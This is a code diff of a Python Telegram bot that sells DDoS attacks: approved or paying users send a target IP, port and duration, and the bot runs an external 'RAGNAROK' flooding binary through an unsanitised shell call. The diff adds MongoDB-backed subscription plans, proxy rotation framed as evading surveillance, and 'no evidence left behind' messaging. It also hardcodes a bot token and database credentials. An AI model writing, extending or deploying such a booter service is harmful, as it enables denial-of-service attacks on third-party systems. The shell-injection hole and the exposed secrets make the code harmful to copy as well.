@@ -1,186 +1,247 @@
+import os
 import telebot
+import json
+import requests
+import logging
 import time
+from pymongo import MongoClient
+from datetime import datetime, timedelta
+import certifi
 import random
-import threading
-import subprocess
+from threading import Thread
+import asyncio
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
-TOKEN = "7716334217:AAERUgMJsePHPQ9paUbcMHudWyBJT3tNITA"  # Replace with your bot token
-ADMIN_ID = 7022875343  # Your admin ID
+loop = asyncio.get_event_loop()
+
+# Bot Configuration: Set with Authority
+TOKEN = '7716334217:AAERUgMJsePHPQ9paUbcMHudWyBJT3tNITA'
+ADMIN_USER_ID = 7022875343
+MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
+USERNAME = "@Anony1764"  # Immutable username for maximum security
+
+# Attack Status Variable to Control Single Execution
+attack_in_progress = False
+
+# Logging for Precision Monitoring
+logging.basicConfig(format='%(asctime)s - ⚔️ %(message)s', level=logging.INFO)
+
+# MongoDB Connection - Operative Data Storage
+client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
+db = client['sharp']
+users_collection = db.users
+
+# Bot Initialization
 bot = telebot.TeleBot(TOKEN)
+REQUEST_INTERVAL = 1
 
-users_energy = {}  # Stores user energy
-authorized_users = set()  # Users allowed to use attack commands
-attack_logs = []  # Stores attack history
-leaderboard = {}  # Tracks total attacks per user
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
-# Energy Regeneration (adds +1 energy every 3 hours)
-def energy_regen():
+# Asyncio Loop for Operations
+async def start_asyncio_thread():
+    asyncio.set_event_loop(loop)
+    await start_asyncio_loop()
+
+# Proxy Update Command with Dark Authority
+def update_proxy():
+    proxy_list = []  # Define proxies here
+    proxy = random.choice(proxy_list) if proxy_list else None
+    if proxy:
+        telebot.apihelper.proxy = {'https': proxy}
+        logging.info("🕴️ Proxy shift complete. Surveillance evaded.")
+
+@bot.message_handler(commands=['update_proxy'])
+def update_proxy_command(message):
+    chat_id = message.chat.id
+    try:
+        update_proxy()
+        bot.send_message(chat_id, f"🔄 Proxy locked in. We’re untouchable. Bot by {USERNAME}")
+    except Exception as e:
+        bot.send_message(chat_id, f"⚠️ Proxy config failed: {e}")
+
+async def start_asyncio_loop():
     while True:
-        time.sleep(10800)  # 3 hours in seconds
-        for user in users_energy:
-            users_energy[user] += 1
-bot_thread = threading.Thread(target=energy_regen)
-bot_thread.start()
+        await asyncio.sleep(REQUEST_INTERVAL)
 
-# Attack Phases
-attack_phases = [
-    "🛠 Initializing Attack...",
-    "🚀 Engaging Target...",
-    "⚡ Overloading Defenses...",
-    "💥 Final Strike Incoming!",
-    "✅ Mission Accomplished!"
-]
+# Attack Initiation - Operative Status Checks and Intensity
+async def run_attack_command_async(target_ip, target_port, duration):
+    global attack_in_progress
+    attack_in_progress = True  # Set the flag to indicate an attack is in progress
 
-# Random Fun Messages
-random_messages = [
-    "How’s the attack going?",
-    "Why are others waiting? Don’t wait too much!",
-    "Want to go paid? Contact the developer!",
-    "Hey you! What are you watching? Don’t you have to study?"
-]
+    process = await asyncio.create_subprocess_shell(f"./RAGNAROK {target_ip} {target_port} {duration} CRACKS")
+    await process.communicate()
 
-# Command to give access to a user
-@bot.message_handler(commands=["add"])
-def add_user(message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    args = message.text.split()
-    if len(args) != 2:
-        bot.reply_to(message, "Usage: /add <user_id>")
-        return
-    user_id = int(args[1])
-    authorized_users.add(user_id)
-    bot.reply_to(message, f"✅ User {user_id} has been authorized!")
+    attack_in_progress = False  # Reset the flag after the attack is complete
+    notify_attack_finished(target_ip, target_port, duration)
 
-# Command to remove access
-@bot.message_handler(commands=["remove"])
-def remove_user(message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    args = message.text.split()
-    if len(args) != 2:
-        bot.reply_to(message, "Usage: /remove <user_id>")
-        return
-    user_id = int(args[1])
-    authorized_users.discard(user_id)
-    bot.reply_to(message, f"❌ User {user_id} has been removed!")
+# Final Attack Message Upon Completion
+def notify_attack_finished(target_ip, target_port, duration):
+    bot.send_message(
+        ADMIN_USER_ID,
+        f"🔥 *MISSION ACCOMPLISHED!* 🔥\n\n"
+        f"🎯 *TARGET NEUTRALIZED:* `{target_ip}`\n"
+        f"💣 *PORT BREACHED:* `{target_port}`\n"
+        f"⏳ *DURATION:* `{duration} seconds`\n\n"
+        f"💥 *Operation Complete. No Evidence Left Behind. Courtesy of {USERNAME}*",
+        parse_mode='Markdown'
+    )
 
-# Generate keys for energy
-@bot.message_handler(commands=["genkey"])
-def generate_key(message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    args = message.text.split()
-    if len(args) != 2 or args[1] not in ["normal", "premium"]:
-        bot.reply_to(message, "Usage: /genkey <normal/premium>")
-        return
-    key_type = args[1]
-    key = f"KEY-{random.randint(10000,99999)}"
-    energy = 1 if key_type == "normal" else 5
-    bot.reply_to(message, f"✅ **Generated {key_type.capitalize()} Key:** `{key}`\n🎁 Redeem for {energy} Energy!")
+@bot.message_handler(commands=['approve', 'disapprove'])
+def approve_or_disapprove_user(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    cmd_parts = message.text.split()
 
-# Redeem key for energy
-@bot.message_handler(commands=["redeem"])
-def redeem_key(message):
-    if message.from_user.id not in authorized_users:
-        bot.reply_to(message, "⚠️ You are not authorized to redeem keys!")
+    if user_id != ADMIN_USER_ID:
+        bot.send_message(chat_id, f"🚫 *Access Denied. Only {USERNAME} controls this realm.*", parse_mode='Markdown')
         return
-    users_energy[message.from_user.id] = users_energy.get(message.from_user.id, 0) + 1
-    bot.reply_to(message, "✅ Key Redeemed! Your energy has increased.")
 
-# Attack Command
-@bot.message_handler(commands=["attack"])
+    if len(cmd_parts) < 2:
+        bot.send_message(chat_id, f"📝 *Format: /approve <user_id> <plan> <days> or /disapprove <user_id>. Reserved by {USERNAME}*", parse_mode='Markdown')
+        return
+
+    action, target_user_id = cmd_parts[0], int(cmd_parts[1])
+    plan, days = (int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0), (int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0)
+
+    if action == '/approve':
+        limit_reached = (plan == 1 and users_collection.count_documents({"plan": 1}) >= 99) or \
+                        (plan == 2 and users_collection.count_documents({"plan": 2}) >= 499)
+        if limit_reached:
+            bot.send_message(chat_id, f"⚠️ *Plan limit reached. Access denied. Controlled by {USERNAME}*", parse_mode='Markdown')
+            return
+
+        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days else datetime.now().date().isoformat()
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
+            upsert=True
+        )
+        msg_text = f"*User {target_user_id} granted access – Plan {plan} for {days} days. Approved by {USERNAME}*"
+    else:
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
+            upsert=True
+        )
+        msg_text = f"*User {target_user_id} removed. Clearance by {USERNAME}*"
+
+    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
+
+@bot.message_handler(commands=['Attack'])
 def attack_command(message):
-    if message.from_user.id not in authorized_users:
-        bot.reply_to(message, "⚠️ You are not authorized to use this command!")
+    global attack_in_progress
+    chat_id = message.chat.id
+
+    # Check if an attack is already in progress
+    if attack_in_progress:
+        bot.send_message(chat_id, f"⚠️ *An attack is already in progress. Please wait until it completes, {USERNAME}.*", parse_mode='Markdown')
         return
 
-    args = message.text.split()
-    if len(args) != 3:
-        bot.reply_to(message, "Usage: /attack <ip> <port>")
-        return
-
-    ip, port = args[1], args[2]
     user_id = message.from_user.id
 
-    # Check if user has enough energy
-    if users_energy.get(user_id, 0) < 1:
-        bot.reply_to(message, "⚠️ Not enough energy! Redeem a key to gain energy.")
-        return
+    try:
+        # Check user access
+        user_data = users_collection.find_one({"user_id": user_id})
+        if not user_data or user_data['plan'] == 0:
+            bot.send_message(chat_id, f"🚫 Unauthorized. Access limited to {USERNAME}.")
+            return
 
-    # Deduct Energy
-    users_energy[user_id] -= 1
+        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
+            bot.send_message(chat_id, f"🟠 Plan 🧡 is full. Reach out to {USERNAME} for upgrades.")
+            return
 
-    # Attack Mode Selection
-    keyboard = telebot.types.InlineKeyboardMarkup()
-    keyboard.add(telebot.types.InlineKeyboardButton("Stealth Mode (120s)", callback_data=f"attack_{user_id}_{ip}_{port}_120"))
-    keyboard.add(telebot.types.InlineKeyboardButton("Brute Force (180s)", callback_data=f"attack_{user_id}_{ip}_{port}_180"))
-    keyboard.add(telebot.types.InlineKeyboardButton("DDoS Storm (300s)", callback_data=f"attack_{user_id}_{ip}_{port}_300"))
+        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
+            bot.send_message(chat_id, f"💥 Instant++ Plan at capacity. Contact {USERNAME}.")
+            return
 
-    bot.send_message(message.chat.id, "Choose attack mode:", reply_markup=keyboard)
+        bot.send_message(chat_id, f"📝 Provide target details – IP, Port, Duration (seconds). Controlled by {USERNAME}")
+        bot.register_next_step_handler(message, process_attack_command)
+    except Exception as e:
+        logging.error(f"Attack command error: {e}")
 
-# Handle Attack Selection
-@bot.callback_query_handler(func=lambda call: call.data.startswith("attack_"))
-def start_attack(call):
-    data = call.data.split("_")
-    _, user_id, ip, port, duration = data
-    user_id = int(user_id)
-    duration = int(duration)
+def process_attack_command(message):
+    try:
+        args = message.text.split()
+        if len(args) != 3:
+            bot.send_message(message.chat.id, f"⚠️ *Format incorrect. Use: /Attack <IP> <Port> <Duration>. Maintained by {USERNAME}*", parse_mode='Markdown')
+            return
 
-    if call.from_user.id != user_id:
-        bot.answer_callback_query(call.id, "⚠️ This isn't your attack session!", show_alert=True)
-        return
+        target_ip, target_port, duration = args[0], int(args[1]), args[2]
 
-    full_command = f"./RAGNAROK {ip} {port} {duration} CRACKS"
-    subprocess.Popen(full_command, shell=True)
+        if target_port in blocked_ports:
+            bot.send_message(message.chat.id, f"🚫 *Port {target_port} restricted. Select a different entry point. Governed by {USERNAME}*", parse_mode='Markdown')
+            return
 
-    # Store attack log
-    attack_logs.append(f"🔹 User: {user_id}\n🎯 Target: {ip}:{port}\n⏳ Duration: {duration} sec")
+        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
+        bot.send_message(
+            message.chat.id,
+            f"💀 *⚠️ ATTACK INITIATED!* 💀\n\n"
+            f"💢 *SIGMA STRIKE IN EFFECT!* 💢\n\n"
+            f"🎯 *TARGET SET:* `{target_ip}`\n"
+            f"🔒 *PORT ACCESSED:* `{target_port}`\n"
+            f"⏳ *DURATION LOCKED:* `{duration} seconds`\n\n"
+            f"🔥 *Unleashing force. No turning back. Powered by {USERNAME}* ⚡",
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        logging.error(f"Error in process_attack_command: {e}")
 
-    # Update leaderboard
-    leaderboard[user_id] = leaderboard.get(user_id, 0) + 1
+def start_asyncio_thread():
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(start_asyncio_loop())
 
-    bot.edit_message_text(f"🔥 **Attack started!**\nTarget: `{ip}:{port}`\nDuration: `{duration}` sec", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    # Unique, Intense Menu Options
+    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
+    options = [
+        "💀 Initiate Attack 🔥", 
+        "🔍 Status Report", 
+        "📜 Mission Brief", 
+        "📞 Contact HQ"
+    ]
+    buttons = [KeyboardButton(option) for option in options]
+    markup.add(*buttons)
 
-    # Start attack phase updates
-    thread = threading.Thread(target=attack_phases_update, args=(user_id, duration, call.message.chat.id))
-    thread.start()
+    bot.send_message(
+        message.chat.id,
+        f"👊 *Welcome to Command, Agent. Choose your directive.* Managed by {USERNAME}",
+        reply_markup=markup,
+        parse_mode='Markdown'
+    )
 
-# Attack Phase Updates
-def attack_phases_update(user_id, duration, chat_id):
-    phase_time = duration // len(attack_phases)
-    for phase in attack_phases:
-        time.sleep(phase_time)
-        bot.send_message(chat_id, phase)
-    bot.send_message(chat_id, "✅ **Attack Finished!**")
-
-# View Attack Log
-@bot.message_handler(commands=["attacklog"])
-def view_logs(message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    if not attack_logs:
-        bot.reply_to(message, "📜 No attacks logged yet.")
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    if message.text == "💀 Initiate Attack 🔥":
+        bot.reply_to(message, f"*Command received. Preparing deployment. Stand by, {USERNAME}*", parse_mode='Markdown')
+        attack_command(message)
+    elif message.text == "🔍 Status Report":
+        user_id = message.from_user.id
+        user_data = users_collection.find_one({"user_id": user_id})
+        if user_data:
+            username = message.from_user.username
+            plan, valid_until = user_data.get('plan', 'N/A'), user_data.get('valid_until', 'N/A')
+            response = (f"*Agent ID: {username}\n"
+                        f"Plan Level: {plan}\n"
+                        f"Authorized Until: {valid_until}\n"
+                        f"Timestamp: {datetime.now().isoformat()}. Verified by {USERNAME}*")
+        else:
+            response = f"*Profile unknown. Contact {USERNAME} for authorization.*"
+        bot.reply_to(message, response, parse_mode='Markdown')
+    elif message.text == "📜 Mission Brief":
+        bot.reply_to(message, f"*For support, type /help or contact {USERNAME} at HQ.*", parse_mode='Markdown')
+    elif message.text == "📞 Contact HQ":
+        bot.reply_to(message, f"*Direct Line to HQ: {USERNAME}*", parse_mode='Markdown')
     else:
-        bot.reply_to(message, "\n\n".join(attack_logs[-5:]))  # Show last 5 attacks
+        bot.reply_to(message, f"❗*Unknown command. Focus, Agent. Managed by {USERNAME}*", parse_mode='Markdown')
 
-# Clear Attack Log
-@bot.message_handler(commands=["clearlog"])
-def clear_logs(message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    attack_logs.clear()
-    bot.reply_to(message, "🗑 Attack logs cleared!")
+if __name__ == "__main__":
+    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
+    asyncio_thread.start()
+    logging.info("🚀 Bot is operational and mission-ready.")
 
-# View Leaderboard
-@bot.message_handler(commands=["leaderboard"])
-def show_leaderboard(message):
-    if not leaderboard:
-        bot.reply_to(message, "🏆 No attacks performed yet!")
-        return
-
-    sorted_leaderboard = sorted(leaderboard.items(), key=lambda x: x[1], reverse=True)[:5]
-    leaderboard_text = "🏆 **Leaderboard**\n" + "\n".join([f"{i+1}️⃣ User {user} - {attacks} Attacks" for i, (user, attacks) in enumerate(sorted_leaderboard)])
-    bot.reply_to(message, leaderboard_text, parse_mode="Markdown")
-
-bot.polling(none_stop=True)
+    while True:
+        try:
+            bot.polling(none_stop=True)
+        except Exception as e:
+            logging.error(f"Polling error: {e}")
